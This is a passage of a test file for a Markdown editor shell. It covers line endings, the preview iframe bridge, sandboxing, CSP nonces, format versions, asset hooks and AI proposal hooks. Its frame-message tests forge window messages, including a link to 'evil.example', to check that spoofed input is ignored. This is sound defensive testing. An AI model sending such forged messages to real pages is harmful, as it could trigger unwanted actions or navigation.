  it('[E.1] each remembered text keeps its own BOM and line endings: a BOM + CR LF document, setText of an LF text, undo, then typing writes BOM + CR LF again; selection offsets in a remembered mixed-EOL text are mapped on that exact string', () => {
    const T0 = '﻿a\r\nb';
    const model = createTextModel(T0);
    model.adopt('x\ny'); // e.g. an AI proposal in LF without a BOM
    expect(model.toExact('a\nb')).toBe(T0); // undone back: exact
    expect(model.toExact('a\nbc')).toBe('﻿a\r\nbc'); // the next keystroke keeps the original's style
    expect(model.toExact('x\ny')).toBe('x\ny'); // back at the LF text: LF without a BOM again
    expect(model.toExact('x\nyz\n')).toBe('x\nyz\n');
    const mixed = createTextModel('a\nb\r\nc'); // style LF (first break), but a CR LF inside
    expect(mixed.toExactOffset('a\nb\nc', 4)).toBe(5);
    expect(mixed.toExactOffset('a\nb\nc', 3)).toBe(3);
    // through the shell, with the textarea engine
    const m = mount({ text: '﻿# Title\r\n\r\nBody\r\n' });
    m.shell.setText('# AI proposal\n\nNew body\n');
    expect(m.shell.undo()).toBe(true);
    expect(m.shell.getText()).toBe('﻿# Title\r\n\r\nBody\r\n');
    type(m, 'More\n');
    expect(m.shell.getText()).toBe('﻿# Title\r\n\r\nBody\r\nMore\r\n');
    m.shell.destroy();
  });
});

describe('events (B-13)', () => {
  it('[E.2] the change event carries the exact text as it was when the event fired (a plain value, not a live getter)', () => {
    const m = mount();
    const seen: Array<{ text: string }> = [];
    m.shell.on('change', (e) => seen.push(e));
    type(m, 'a');
    type(m, 'b');
    expect(seen.map((e) => e.text)).toEqual([`${CRLF_BOM}a`, `${CRLF_BOM}ab`]);
    expect(typeof Object.getOwnPropertyDescriptor(seen[0], 'text')!.value).toBe('string');
    m.shell.destroy();
  });
});

describe('frame messages (A-2, E06)', () => {
  it('[E.14] window messages never act: a save key, the view key, Escape or a link posted on the window does nothing — with the reader in the editor, with the focus on the preview frame and with user activation alike, and for a bridge without the port; the same reports through the authenticated port act', async () => {
    const save = vi.fn(async () => undefined);
    const links: string[] = [];
    const m = mount({ hooks: { save }, onLink: (h) => links.push(h) });
    const f = authFrameOf(m);
    const ta = m.ta();
    const forge = () => {
      for (const key of ['Escape', 's', '\\']) f.say({ type: 'orz-preview-key', key });
      f.say({ type: 'orz-preview-link', href: 'https://evil.example/' });
    };
    ta.focus();
    activation(m, true);
    forge();
    await tick();
    expect([m.root.activeElement === ta, save.mock.calls.length, m.shell.getMode(), links]).toEqual([true, 0, 'split', []]);
    // the focus on the frame (the reader's click, or a document script's focus()) and fresh activation: still nothing
    f.iframe.focus();
    activation(m, true);
    forge();
    await tick();
    expect([m.root.activeElement === f.iframe, save.mock.calls.length, m.shell.getMode(), links]).toEqual([true, 0, 'split', []]);
    // through the port: the reader's own keys and click in the frame
    f.bridge({ type: 'orz-preview-key', key: 's' });
    f.bridge({ type: 'orz-preview-link', href: 'https://example.org/' });
    await tick();
    expect([save.mock.calls.length, links]).toEqual([1, ['https://example.org/']]);
    f.bridge({ type: 'orz-preview-key', key: '\\' });
    expect(m.shell.getMode()).toBe('editor');
    f.bridge({ type: 'orz-preview-key', key: 'Escape' });
    expect(m.root.activeElement?.getAttribute('data-mode')).toBe('editor');
    m.shell.destroy();
    // a bridge without the port (a plain ready): renders only — its keys and links never act
    const n = mount({ hooks: { save }, onLink: (h) => links.push(h) });
    const g = frameOf(n);
    g.say({ type: 'orz-preview-ready' });
    g.iframe.focus();
    activation(n, true);
    for (const key of ['Escape', 's', '\\']) g.say({ type: 'orz-preview-key', key });
    g.say({ type: 'orz-preview-link', href: 'https://evil.example/' });
    await tick(30);
    expect([n.root.activeElement === g.iframe, save.mock.calls.length, n.shell.getMode(), links.length]).toEqual([true, 1, 'split', 1]);
    expect(g.posted.some((x) => x.type === 'orz-preview-render')).toBe(true);
    n.shell.destroy();
  });

  it('[E.14] the frame\'s "active" and scroll reports never move an editor that has focus or that the reader just touched; the preview leads only after its own report, with the editor untouched; the same messages on the window never move it', async () => {
    const engine = textareaAdapter();
    const scrollTo = vi.spyOn(engine, 'scrollTo');
    const m = mount({ adapter: engine });
    const f = authFrameOf(m);
    const flood = () => { f.bridge({ type: 'orz-preview-active' }); f.bridge({ type: 'orz-preview-scrolled', top: 0, max: 1000 }); };
    m.ta().focus();
    await tick(350);
    flood();
    expect(scrollTo).not.toHaveBeenCalled(); // the editor has focus
    m.ta().blur();
    m.ta().dispatchEvent(new m.win.PointerEvent('pointermove', { bubbles: true }) as unknown as Event);
    flood();
    expect(scrollTo).not.toHaveBeenCalled(); // the reader's pointer is on the editor
    await tick(1600); // the frame's earlier reports have expired
    f.bridge({ type: 'orz-preview-scrolled', top: 500, max: 1000 });
    expect(scrollTo).not.toHaveBeenCalled(); // no fresh report of the reader in the frame
    f.say({ type: 'orz-preview-active' });
    f.say({ type: 'orz-preview-scrolled', top: 0, max: 1000 });
    expect(scrollTo).not.toHaveBeenCalled(); // window messages: data, never a scroll
    flood();
    expect(scrollTo).toHaveBeenCalledWith({ fraction: 0 }); // the reader is in the preview (as far as the page can tell)
    m.shell.destroy();
  });
});

describe('preview rendering (B-5, B-9, B-11, item 11)', () => {
  it('[E.16] renders wait max(debounceMs, 2 × the last render time), never overlap, and coalesce: a slow renderer runs a few times for a burst of typing, not once per keystroke, and the last render is of the final text', async () => {
    let running = 0;
    let most = 0;
    const texts: string[] = [];
    const render = async (t: string) => {
      running++;
      most = Math.max(most, running);
      await tick(40);
      running--;
      texts.push(t);
      return `<p>${t.length}</p>`;
    };
    const m = mount({ render, preview: { assets: false, debounceMs: 10 } });
    await tick(80); // the first render (40 ms) sets the pace: 80 ms pauses from now on
    const before = texts.length;
    for (let i = 0; i < 20; i++) { type(m, 'x'); await tick(25); } // a keystroke every 25 ms > debounceMs
    await tick(300);
    const during = texts.length - before;
    expect(during).toBeLessThanOrEqual(5); // 20 keystrokes; at the fixed 10 ms pause it was one render per key
    expect(most).toBe(1);
    expect(texts.at(-1)).toBe(m.shell.getText());
    // refreshPreview during a render waits for it, then renders the latest text
    type(m, 'y');
    const p = m.shell.refreshPreview();
    type(m, 'z');
    await m.shell.refreshPreview();
    await p;
    expect(texts.at(-1)).toBe(m.shell.getText());
    expect(most).toBe(1);
    m.shell.destroy();
  });

  it('[E.15] a carrier can supply its own frame document and bridge, turn the incremental diff off, navigate by source line, and map lines ↔ tops', async () => {
    const parts: unknown[] = [];
    const custom = previewFrameDocument({ assets: false, bridge: 'window.parent.postMessage({type:"orz-preview-ready"},"*")', nonce: 'n1', frameDocument: (p) => { parts.push(p); return `<!doctype html><div id="orz-doc"></div>${p.bridge}`; } });
    expect(custom).toBe('<!doctype html><div id="orz-doc"></div><script nonce="n1">window.parent.postMessage({type:"orz-preview-ready"},"*")</script>');
    expect(parts[0]).toMatchObject({ scripts: '', scheme: 'light', articleClass: 'markdown-body', nonce: 'n1' });
    expect(previewFrameDocument()).toContain(`<script>${PREVIEW_BRIDGE}</script>`);
    // diff: false → the render message says so (the bridge replaces the content whole, keeping the scroll)
    const whole = mount({ render: (t) => `<p>${t.length}</p>`, preview: { assets: false, debounceMs: 5, diff: false } });
    const fw = frameOf(whole);
    fw.say({ type: 'orz-preview-ready' });
    await tick(30);
    expect(fw.posted.find((x) => x.type === 'orz-preview-render')).toMatchObject({ diff: false });
    expect(PREVIEW_BRIDGE).toContain('d.diff===false');
    whole.shell.destroy();
    // navigate: the caret's source line goes to the frame; a line the frame reports scrolls the editor
    const engine = textareaAdapter();
    const scrollTo = vi.spyOn(engine, 'scrollTo');
    const nav = mount({ text: 'a\nb\nc\nd\ne\n', adapter: engine, preview: { assets: false, debounceMs: 5, mode: 'navigate' } });
    const fn = authFrameOf(nav);
    nav.ta().focus();
    nav.ta().setSelectionRange(6, 6); // line 3
    nav.ta().dispatchEvent(new nav.win.Event('select') as unknown as Event);
    await tick(40);
    expect(fn.sent.filter((x) => x.type === 'orz-preview-navigate').at(-1)).toEqual({ type: 'orz-preview-navigate', line: 3 });
    fn.iframe.focus();
    fn.say({ type: 'orz-preview-scrolled', line: 2 }); // on the window: data, no scroll
    expect(scrollTo).not.toHaveBeenCalledWith({ line: 2 });
    fn.bridge({ type: 'orz-preview-scrolled', line: 4 }); // __orzPreview.navigated(4), through the port
    expect(scrollTo).toHaveBeenLastCalledWith({ line: 4 });
    nav.shell.destroy();
    // mapLine / mapPosition replace the anchor maths
    const mapped = textareaAdapter();
    vi.spyOn(mapped, 'getScroll').mockReturnValue({ line: 4, fraction: 0.5 });
    const toLine = vi.spyOn(mapped, 'scrollTo');
    const mp = mount({ adapter: mapped, preview: { assets: false, debounceMs: 5, mapLine: (l) => l * 10, mapPosition: (t) => t / 10 } });
    const fm = authFrameOf(mp);
    mp.ta().dispatchEvent(new mp.win.Event('scroll') as unknown as Event);
    await tick(40);
    expect(fm.sent.filter((x) => x.type === 'orz-preview-scroll').at(-1)).toEqual({ type: 'orz-preview-scroll', top: 40 });
    fm.iframe.focus();
    fm.bridge({ type: 'orz-preview-scrolled', top: 70, max: 1000 });
    expect(toLine).toHaveBeenLastCalledWith({ line: 7 });
    mp.shell.destroy();
  });

  it('[E.19] preview.nonce is stamped on every <script> and <style> of the frame document; PREVIEW_BRIDGE_HASH is the bridge\'s SHA-256 and previewScriptHashes lists every inline script; a frame that never says ready is an error (render) and a quiet notice, gone when it starts', async () => {
    const full = previewFrameDocument({ nonce: 'r4nd"om', head: '<style>.x{}</style>' });
    const tags = full.match(/<(script|style)\b[^>]*>/g)!;
    expect(tags.length).toBeGreaterThan(6);
    for (const t of tags) expect(t).toContain(' nonce="r4nd&quot;om"');
    expect(PREVIEW_BRIDGE_HASH).toBe(`sha256-${createHash('sha256').update(PREVIEW_BRIDGE, 'utf8').digest('base64')}`);
    const inline = [...previewFrameDocument().matchAll(/<script>([\s\S]*?)<\/script>/g)].map((x) => `sha256-${createHash('sha256').update(x[1], 'utf8').digest('base64')}`);
    expect(await previewScriptHashes()).toEqual([...new Set(inline)]);
    expect(await previewScriptHashes({ assets: false })).toEqual([PREVIEW_BRIDGE_HASH]);
    const m = mount({ preview: { assets: false, readyTimeoutMs: 30 } });
    const errors: string[] = [];
    m.shell.on('error', (e) => errors.push(e.source));
    const f = frameOf(m);
    await expect.poll(() => errors, { timeout: 2000 }).toEqual(['render']); // the error names the frame's script hashes (computed: 2.5.0, D-80)
    expect(m.root.querySelector('.orz-editor__preview-note')!.textContent).toBe('The preview could not start on this page.');
    f.say({ type: 'orz-preview-ready' });
    expect(m.root.querySelector('.orz-editor__preview-note')).toBeNull();
    m.shell.destroy();
    // a frame that starts in time: no error, no notice
    const ok = mount({ preview: { assets: false, readyTimeoutMs: 30 } });
    frameOf(ok).say({ type: 'orz-preview-ready' });
    const none: string[] = [];
    ok.shell.on('error', (e) => none.push(e.source));
    await tick(60);
    expect(none).toEqual([]);
    ok.shell.destroy();
  });

  it('[E.20] the preview sandbox is decided in one place, previewSandbox(context): allow-scripts for every app host and every served page, plus allow-same-origin only for a standalone file: page (owner, B-2); the shell passes it the host kind and the page protocol', () => {
    for (const host of ['app', 'standalone'] as const) {
      for (const protocol of ['https:', 'http:', 'file:', 'blob:', '']) {
        expect(previewSandbox({ host, protocol })).toBe(host === 'standalone' && protocol === 'file:' ? 'allow-scripts allow-same-origin' : 'allow-scripts');
      }
    }
    const src = readFileSync('src/carrier/editor/preview.ts', 'utf8');
    expect(src.match(/setAttribute\('sandbox'/g)).toHaveLength(1);
    expect(src).toMatch(/\biframe\.setAttribute\('sandbox', previewSandbox\(/); // in createPreview, the one place the preview iframe is made
    for (const f of ['adapter', 'codemirror6', 'index', 'preview', 'render-md', 'shell', 'styles', 'text-model', 'types']) {
      const code = readFileSync(`src/carrier/editor/${f}.ts`, 'utf8').replace(/\/\*[\s\S]*?\*\//g, '').replace(/\/\/[^\n]*/g, ''); // code, not comments
      if (f === 'preview') expect(code.match(/allow-same-origin/g), f).toHaveLength(1); // previewSandbox's file: case only
      else expect(code, f).not.toContain('allow-same-origin');
      if (f !== 'preview') expect(code, f).not.toMatch(/setAttribute\(\s*['"]sandbox/);
    }
    const ctx = page();
    const el = ctx.mountPoint();
    const s = createEditorShell(el, { text: '# x', render: () => '', adapter: textareaAdapter(), assemble: () => '', preview: { assets: false } });
    expect((s.root as unknown as ShadowRoot).querySelector('iframe')!.getAttribute('sandbox')).toBe('allow-scripts');
    s.destroy();
  });
});

describe('text formats (B-8, FC-18 §8.4)', () => {
  it('[E.17] a header format newer than formats (default [1]) opens read-only with a quiet notice and an error (format); save() refuses without calling hooks.save or the saver; formats: [1, 2] edits it; a newer format set later is not saved either', async () => {
    const text = `{{nyml\nkind: document\nformat: 2\nuid: ${UID_B}\n}}\n\n# Future\n`;
    const save = vi.fn(async () => undefined);
    const saver = fakeSaver({ via: 'file', ok: true });
    const m = mount({ text, hooks: { save } });
    const errors: unknown[] = [];
    m.shell.on('error', (e) => errors.push([e.source, e.message]));
    await tick();
    expect(errors).toEqual([['format', 'text format 2 is newer than this editor (format 1): read-only, not saved']]);
    expect(m.shell.readOnly).toBe(true);
    expect(m.ta().readOnly).toBe(true);
    expect((m.root.querySelector('.orz-editor__save') as HTMLElement).hidden).toBe(true);
    expect(m.root.querySelector('#orz-format-note')!.textContent).toContain('text format 2');
    m.shell.setReadOnly(false); // a newer format stays read-only
    expect([m.shell.isReadOnly(), m.shell.readOnly, m.ta().readOnly]).toEqual([true, true, true]);
    const r = await m.shell.save();
    expect(r).toMatchObject({ ok: false });
    expect((r as { error: string }).error).toContain('newer than this editor');
    key(m, m.ta(), 's', { ctrl: true });
    await tick();
    expect(save).not.toHaveBeenCalled();
    m.shell.destroy();
    const s = mount({ text, assemble: () => '<html>', saver: saver.saver });
    expect(await s.shell.save()).toMatchObject({ ok: false });
    expect(saver.saves).toEqual([]);
    s.shell.destroy();
    // a shell that reads format 2
    const two = mount({ text, formats: [1, 2], hooks: { save } });
    expect(two.shell.readOnly).toBe(false);
    expect(two.root.querySelector('#orz-format-note')).toBeNull();
    await expect(two.shell.save()).resolves.toEqual({ ok: true, via: 'hook' });
    two.shell.destroy();
    // format 1 text, then a newer format set through the API: not saved
    const later = mount({ text: TEXTS.LF, hooks: { save } });
    later.shell.setHeader({ format: '3' });
    expect(await later.shell.save()).toMatchObject({ ok: false });
    expect(save).toHaveBeenCalledTimes(1);
    later.shell.destroy();
  });
});

describe('save notices (B-3, B-16)', () => {
  it('[E.8] a download says "Download started." (the browser has it, it may not have finished) and clears dirty; on a served page Cmd/Ctrl+S with nothing unsaved stays quiet, with unsaved edits it shows the notice', async () => {
    const dl = fakeSaver({ via: 'download', ok: true, confirmed: false } as SaveResult);
    const m = mount({ assemble: () => '<html>', saver: dl.saver });
    type(m, 'x');
    await expect(m.shell.save()).resolves.toEqual({ ok: true, via: 'download' });
    expect(toasts(m.root)).toEqual(['Download started.']);
    expect(m.shell.isDirty()).toBe(false);
    m.shell.destroy();
    const served = fakeSaver({ via: 'served-notice' });
    const s = mount({ assemble: () => '<html>', saver: served.saver });
    key(s, s.ta(), 's', { meta: true });
    await tick(10);
    expect(s.root.querySelector('#orz-served-note')).toBeNull();
    type(s, 'edit');
    key(s, s.ta(), 's', { meta: true });
    await tick(10);
    expect(s.root.querySelector('#orz-served-note')).not.toBeNull();
    s.shell.destroy();
  });
});

describe('FC-19 §3 hooks (B-10)', () => {
  it('[E.18] rewriteAssetUrls sends relative src / srcset / poster (and href of non-links) through resolveAsset; absolute, root, fragment and data references, <a href> and unreadable tags stay; a throwing resolver leaves the reference', () => {
    const r = (p: string) => (p === 'boom.png' ? (() => { throw new Error('x'); })() : `blob:app/${p}`);
    expect(rewriteAssetUrls('<p><img src="a b.png" alt="x"><img src=\'c.png\'><img src=d.png></p>', r)).toBe('<p><img src="blob:app/a b.png" alt="x"><img src="blob:app/c.png"><img src="blob:app/d.png"></p>');
    expect(rewriteAssetUrls('<img srcset="s1.png 1x, https://x/s2.png 2x, s3.png 3x">', r)).toBe('<img srcset="blob:app/s1.png 1x, https://x/s2.png 2x, blob:app/s3.png 3x">');
    expect(rewriteAssetUrls('<video poster="p.jpg" src="v.mp4"></video><link rel="stylesheet" href="t.css">', r)).toBe('<video poster="blob:app/p.jpg" src="blob:app/v.mp4"></video><link rel="stylesheet" href="blob:app/t.css">');
    const kept = '<a href="x.md">x</a><img src="https://h/i.png"><img src="/root.png"><img src="#f"><img src="data:image/png;base64,AA"><img src="//cdn/x.png"><img src="boom.png"><img src="">';
    expect(rewriteAssetUrls(kept, r)).toBe(kept);
    expect(rewriteAssetUrls('<img src="a&amp;b.png">', (p) => `u:${p}`)).toBe('<img src="u:a&amp;b.png">');
    expect(rewriteAssetUrls('<p>text with src="x.png" in it</p>', r)).toBe('<p>text with src="x.png" in it</p>');
    // renderMarkdownPreview takes the render context, so it can be passed as `render` directly
    const direct = mount({ render: renderMarkdownPreview, hooks: { resolveAsset: (p) => `u:${p}` } });
    expect(direct.shell.getText()).toBe(CRLF_BOM);
    direct.shell.destroy();
  });

  it('[E.18] render gets a context with the host\'s fetchInclude and resolveAsset; the preview receives the HTML with assets resolved; a preview link goes through resolveLink, then onLink', async () => {
    const ctxs: RenderContext[] = [];
    const fetchInclude = vi.fn(async (t: string) => `included ${t}`);
    const links: string[] = [];
    const m = mount({
      text: '![p](img/p.png)\n',
      render: (t, ctx) => { ctxs.push(ctx); return renderMarkdownPreview(t); },
      hooks: { fetchInclude, resolveAsset: (p) => `https://cdn.app/${p}`, resolveLink: (h) => `https://app.example/open?d=${encodeURIComponent(h)}` },
      onLink: (h) => links.push(h),
    });
    const f = authFrameOf(m);
    await tick(40);
    expect(await ctxs[0].fetchInclude!('a.md')).toBe('included a.md');
    expect(ctxs[0].resolveAsset!('x.png')).toBe('https://cdn.app/x.png');
    const html = String(f.sent.filter((x) => x.type === 'orz-preview-render').at(-1)!.html);
    expect(html).toContain('src="https://cdn.app/img/p.png"');
    f.bridge({ type: 'orz-preview-link', href: 'week2.md' });
    expect(links).toEqual(['https://app.example/open?d=week2.md']);
    m.shell.destroy();
  });

  it('[E.18] a file pasted or dropped into the editor goes to uploadAsset and its Markdown (image or link) is inserted at the caret as ONE undoable edit in the document\'s line endings; without the hook the engine keeps the event', async () => {
    const uploadAsset = vi.fn(async (f: EdFile) => `assets/${f.name}`);
    const m = mount({ text: 'a\r\nb\r\n', hooks: { uploadAsset } });
    const ta = m.ta();
    ta.focus();
    ta.setSelectionRange(2, 2); // start of line "b" (editor offsets)
    const paste = new m.win.Event('paste', { bubbles: true, cancelable: true });
    Object.defineProperty(paste, 'clipboardData', { value: { files: [{ name: 'my pic (1).png', type: 'image/png', size: 3 }, { name: 'notes.pdf', type: 'application/pdf', size: 9 }] } });
    ta.dispatchEvent(paste as unknown as Event);
    expect(paste.defaultPrevented).toBe(true);
    await tick(10);
    expect(m.shell.getText()).toBe('a\r\n![my pic (1)](assets/my%20pic%20%281%29.png)\r\n[notes.pdf](assets/notes.pdf)b\r\n');
    expect(ta.selectionStart).toBe(2 + '![my pic (1)](assets/my%20pic%20%281%29.png)\n[notes.pdf](assets/notes.pdf)'.length);
    expect(m.shell.undo()).toBe(true);
    expect(m.shell.getText()).toBe('a\r\nb\r\n');
    const drop = new m.win.Event('drop', { bubbles: true, cancelable: true });
    Object.defineProperty(drop, 'dataTransfer', { value: { files: [{ name: 'd.jpg', type: 'image/jpeg', size: 1 }], types: ['Files'] } });
    ta.dispatchEvent(drop as unknown as Event);
    await tick(10);
    expect(m.shell.getText()).toContain('![d](assets/d.jpg)');
    // a failing upload: an error (hook), a toast, nothing inserted
    const bad = mount({ hooks: { uploadAsset: async () => { throw new Error('too large'); } } });
    const errors: string[] = [];
    bad.shell.on('error', (e) => errors.push(`${e.source}: ${e.message}`));
    const before = bad.shell.getText();
    await expect(bad.shell.uploadAssets([{ name: 'x.png', type: 'image/png', size: 1 }])).resolves.toEqual({ ok: false, inserted: [], error: 'too large' });
    expect(errors).toEqual(['hook: too large']);
    expect(bad.shell.getText()).toBe(before);
    // no hook: the paste is the engine's
    const none = mount();
    const p2 = new none.win.Event('paste', { bubbles: true, cancelable: true });
    Object.defineProperty(p2, 'clipboardData', { value: { files: [{ name: 'x.png', type: 'image/png', size: 1 }] } });
    none.ta().dispatchEvent(p2 as unknown as Event);
    expect(p2.defaultPrevented).toBe(false);
    for (const s of [m, bad, none]) s.shell.destroy();
  });

  it('[E.18] requestAi sends the exact text (and the selection as exact offsets) to hooks.ai.request and applies proposed as ONE undoable edit in the document\'s line endings and BOM; a changed text, a failed hook or read-only refuse', async () => {
    const calls: unknown[] = [];
    let reply = 'Better\nwords';
    const request = vi.fn(async (op: string, ctx: { text: string; selection?: { from: number; to: number } }) => { calls.push([op, ctx]); return { proposed: reply }; });
    const ai = { operations: [{ id: 'rewrite', title: 'Rewrite', selection: true }, { id: 'tidy', title: 'Tidy', selection: false }], request };
    const m = mount({ hooks: { ai } });
    const editor = toEditorText(CRLF_BOM);
    const at = editor.indexOf('# Week 3');
    m.ta().setSelectionRange(at, at + '# Week 3'.length);
    await expect(m.shell.requestAi('rewrite')).resolves.toEqual({ ok: true, op: 'rewrite' });
    const [, ctx] = calls[0] as [string, { text: string; selection: { from: number; to: number } }];
    expect(ctx.text).toBe(CRLF_BOM);
    expect(CRLF_BOM.slice(ctx.selection.from, ctx.selection.to)).toBe('# Week 3');
    expect(m.shell.getText()).toBe(CRLF_BOM.replace('# Week 3', 'Better\r\nwords'));
    expect(m.shell.undo()).toBe(true);
    expect(m.shell.getText()).toBe(CRLF_BOM);
    // whole-text operation: the document keeps its BOM and CR LF
    reply = '# All new\n\ntext\n';
    await expect(m.shell.requestAi('tidy')).resolves.toEqual({ ok: true, op: 'tidy' });
    expect(m.shell.getText()).toBe('﻿# All new\r\n\r\ntext\r\n');
    m.shell.undo();
    // the reader typed while the request ran: refused, nothing applied
    request.mockImplementationOnce(async () => { type(m, 'typed'); return { proposed: 'late' }; });
    expect(await m.shell.requestAi('tidy')).toEqual({ ok: false, error: 'the text changed during the AI request' });
    expect(m.shell.getText()).toBe(`${CRLF_BOM}typed`);
    request.mockImplementationOnce(async () => { throw new Error('quota'); });
    expect(await m.shell.requestAi('tidy')).toEqual({ ok: false, error: 'quota' });
    m.ta().setSelectionRange(3, 3);
    expect(await m.shell.requestAi('rewrite')).toEqual({ ok: false, error: 'no selection' });
    m.shell.destroy();
    const ro = mount({ readOnly: true, hooks: { ai } });
    expect(await ro.shell.requestAi('tidy')).toEqual({ ok: false, error: 'read-only' });
    ro.shell.destroy();
  });

  it('[E.26] proposeAi runs hooks.ai.request like requestAi but changes nothing: it resolves a frozen proposal with the exact-text range (the selection, or the whole text) and the original passage; applyAi applies it (or the reader\'s edit of it) as ONE undoable edit in the document\'s line endings and BOM, and refuses — changing nothing — after any edit since, when read-only, after destroy, twice, or for another editor\'s proposal', async () => {
    const calls: Array<{ op: string; text: string; selection?: { from: number; to: number } }> = [];
    const hooks = { ai: { operations: [{ id: 'rewrite', title: 'Rewrite', selection: true }, { id: 'tidy', title: 'Tidy', selection: false }], request: async (op: string, c: { text: string; selection?: { from: number; to: number } }) => { calls.push({ op, ...c }); return { proposed: op === 'tidy' ? 'Tidied\nwhole\n' : 'NEW\nPASSAGE' }; } } };
    const m = mount({ hooks });
    const before = m.shell.getText();
    const at = before.indexOf('# Week 3\r\n') + 2;
    const ta = m.ta();
    const d = ta.value;
    ta.setSelectionRange(d.indexOf('# Week 3') + 2, d.indexOf('# Week 3') + 2 + 'Week 3'.length);
    const p = await m.shell.proposeAi('rewrite');
    expect(p.ok).toBe(true);
    if (!p.ok) return;
    expect(m.shell.getText()).toBe(before); // nothing changed yet
    expect(m.shell.isDirty()).toBe(false);
    expect(p.proposal).toMatchObject({ op: 'rewrite', proposed: 'NEW\nPASSAGE', passage: true, range: { from: at, to: at + 6 }, original: 'Week 3' });
    expect(Object.isFrozen(p.proposal)).toBe(true);
    expect(calls[0]).toEqual({ op: 'rewrite', text: before, selection: { from: at, to: at + 6 } });
    // apply the reader's edit of it: one undoable edit, CR LF kept
    expect(m.shell.applyAi(p.proposal, { proposed: 'EDITED\nBY READER' })).toEqual({ ok: true, op: 'rewrite' });
    expect(m.shell.getText()).toBe(`${before.slice(0, at)}EDITED\r\nBY READER${before.slice(at + 6)}`);
    expect(m.shell.applyAi(p.proposal)).toEqual({ ok: false, error: 'not a proposal of this editor' }); // once
    expect(m.shell.undo()).toBe(true);
    expect(m.shell.getText()).toBe(before);
    // a whole-document proposal keeps the BOM; an edit made meanwhile refuses it
    const w = await m.shell.proposeAi('tidy');
    expect(w.ok && w.proposal.range).toEqual({ from: 0, to: before.length });
    type(m, 'x');
    expect(w.ok && m.shell.applyAi(w.proposal)).toEqual({ ok: false, error: 'the text changed since the AI proposal was made' });
    expect(m.shell.getText()).toBe(`${before}x`);
    const w2 = await m.shell.proposeAi('tidy');
    expect(w2.ok && m.shell.applyAi(w2.proposal)).toEqual({ ok: true, op: 'tidy' });
    expect(m.shell.getText()).toBe('﻿Tidied\r\nwhole\r\n');
    // another editor's proposal, read-only, destroyed
    const other = mount({ hooks });
    const op = await other.shell.proposeAi('tidy');
    expect(op.ok && m.shell.applyAi(op.proposal)).toEqual({ ok: false, error: 'not a proposal of this editor' });
    const rp = await other.shell.proposeAi('tidy');
    other.shell.setReadOnly(true);
    expect(rp.ok && other.shell.applyAi(rp.proposal)).toEqual({ ok: false, error: 'read-only' });
    expect(await other.shell.proposeAi('tidy')).toEqual({ ok: false, error: 'read-only' });
    other.shell.setReadOnly(false);
    const dp = await other.shell.proposeAi('tidy');
    other.shell.destroy();
    expect(dp.ok && other.shell.applyAi(dp.proposal)).toEqual({ ok: false, error: 'destroyed' });
    // a passage operation without a selection, a failing hook
    ta.setSelectionRange(0, 0);
    expect(await m.shell.proposeAi('rewrite')).toEqual({ ok: false, error: 'no selection' });
    const failing = mount({ hooks: { ai: { operations: [], request: async () => { throw new Error('quota'); } } } });
    expect(await failing.shell.proposeAi('x')).toEqual({ ok: false, error: 'quota' });
    // requestAi is unchanged: propose + apply at once
    const r = mount({ hooks });
    expect(await r.shell.requestAi('tidy')).toEqual({ ok: true, op: 'tidy' });
    expect(r.shell.getText()).toBe('﻿Tidied\r\nwhole\r\n');
    for (const x of [m, failing, r]) x.shell.destroy();
  });

  it('[E.18] ensureUid returns the header uid, or mints one (hooks.mintUid, else the kit\'s) and sets it as one undoable header edit; a malformed minted uid is refused', async () => {
    const withUid = mount();
    const mint = vi.fn(async () => 'doc-hostminted00001');
    expect(await withUid.shell.ensureUid()).toBe(UID_A);
    withUid.shell.destroy();
    const m = mount({ text: '# No header\r\n', hooks: { mintUid: mint } });
    expect(await m.shell.ensureUid()).toBe('doc-hostminted00001');
    expect(m.shell.getText()).toBe('{{nyml\r\nkind: document\r\nuid: doc-hostminted00001\r\n}}\r\n\r\n# No header\r\n');
    expect(await m.shell.ensureUid()).toBe('doc-hostminted00001');
    expect(mint).toHaveBeenCalledTimes(1);
    m.shell.undo();
    expect(m.shell.getText()).toBe('# No header\r\n');
    m.shell.destroy();
    const kit = mount({ text: TEXTS['no header'] });
    expect(await kit.shell.ensureUid()).toMatch(/^doc-[0-9a-z]{16}$/);
    kit.shell.destroy();
    const bad = mount({ text: '# x\n', hooks: { mintUid: async () => 'not-a-uid' } });
    await expect(bad.shell.ensureUid()).rejects.toThrow(/must match/);
    expect(bad.shell.getText()).toBe('# x\n');
    bad.shell.destroy();
  });
});

describe('read-only at run time (shell-runtime §7.2)', () => {
  it('[E.22] setReadOnly(true) makes the engine read-only, hides Save and refuses save, Cmd/Ctrl+S, uploads and AI; setReadOnly(false) restores all of it; isReadOnly() and readOnly follow', async () => {
    const save = vi.fn(async () => undefined);
    const uploadAsset = vi.fn(async () => 'a.png');
    const ai = { operations: [{ id: 'tidy', title: 'Tidy', selection: false }], request: vi.fn(async () => ({ proposed: 'x' })) };
    const m = mount({ hooks: { save, uploadAsset, ai } });
    const btn = m.root.querySelector('.orz-editor__save') as HTMLElement;
    expect([m.shell.isReadOnly(), btn.hidden, m.ta().readOnly]).toEqual([false, false, false]);
    m.shell.setReadOnly(true);
    expect([m.shell.isReadOnly(), m.shell.readOnly, btn.hidden, m.ta().readOnly]).toEqual([true, true, true, true]);
    expect(m.root.querySelector('.orz-editor')!.hasAttribute('data-readonly')).toBe(true);
    expect(await m.shell.save()).toEqual({ ok: false, error: 'read-only' });
    key(m, m.ta(), 's', { ctrl: true });
    expect(await m.shell.uploadAssets([{ name: 'a.png', type: 'image/png', size: 1 }])).toMatchObject({ ok: false, error: 'read-only' });
    expect(await m.shell.requestAi('tidy')).toEqual({ ok: false, error: 'read-only' });
    await tick();
    expect([save.mock.calls.length, uploadAsset.mock.calls.length, ai.request.mock.calls.length]).toEqual([0, 0, 0]);
    expect(m.shell.getText()).toBe(CRLF_BOM);
    m.shell.setReadOnly(false);
    expect([m.shell.isReadOnly(), btn.hidden, m.ta().readOnly]).toEqual([false, false, false]);
    type(m, '!');
    await expect(m.shell.save()).resolves.toEqual({ ok: true, via: 'hook' });
    m.shell.destroy();
  });
});

describe('engine history (B-19)', () => {
  it('[E.21] the textarea history stores patches, not copies: 60 steps of a 200 KB text hold about two copies, and undo/redo walk every step exactly', () => {
    const big = `${'Lorem ipsum dolor sit amet. '.repeat(7300)}\n`;
    const m = mount({ text: big });
    const states = [m.shell.getText()];
    for (let i = 0; i < 60; i++) {
      const t = m.shell.getText();
      const at = (i * 3331) % t.length;
      m.shell.setText(t.slice(0, at) + `<${i}>` + t.slice(at + (i % 3)));
      states.push(m.shell.getText());
    }
    const held = historyChars(m.shell.adapter)!;
    expect(held).toBeLessThan(big.length * 2.5);
